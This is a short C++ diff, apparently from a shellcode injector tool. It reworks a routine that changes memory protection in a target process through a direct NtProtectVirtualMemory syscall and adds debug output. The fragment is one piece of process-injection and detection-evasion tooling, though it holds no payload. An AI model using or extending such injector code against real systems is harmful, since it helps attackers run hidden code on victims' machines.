@@ -114,8 +114,18 @@ injectorMethod mainInjector;
 
 
         DWORD oldProtect = 0;
-		std::cout << "executing syscall with proc: " << proc << " buff: " << buff << " len_shellcode: " << len_shellcode << " flag: " << flag << "\n";
-        NTSTATUS status = sysNtProtectVirtualMemory(proc, &buff, &len_shellcode, flag, &oldProtect);
+		
+        PVOID baseAddress = buff;
+        SIZE_T sizeToProtect = len_shellcode;
+
+        std::cout << "executing syscall with proc: " << proc
+            << " base: " << baseAddress
+            << " size: " << sizeToProtect
+            << " flag: " << flag << "\n";
+
+        // Call using the temporary variables
+        NTSTATUS status = sysNtProtectVirtualMemory(proc, &baseAddress, &sizeToProtect, flag, &oldProtect);
+        //NTSTATUS status = sysNtProtectVirtualMemory(proc, &buff, &len_shellcode, flag, &oldProtect);
         //std::cout << "NtProtectVirtualMemory: " << status << " error: " << GetLastError() << "\n";
 		std::cout << "-----exiting protectMemFlag with status: " << status << "-----\n";
         return status;
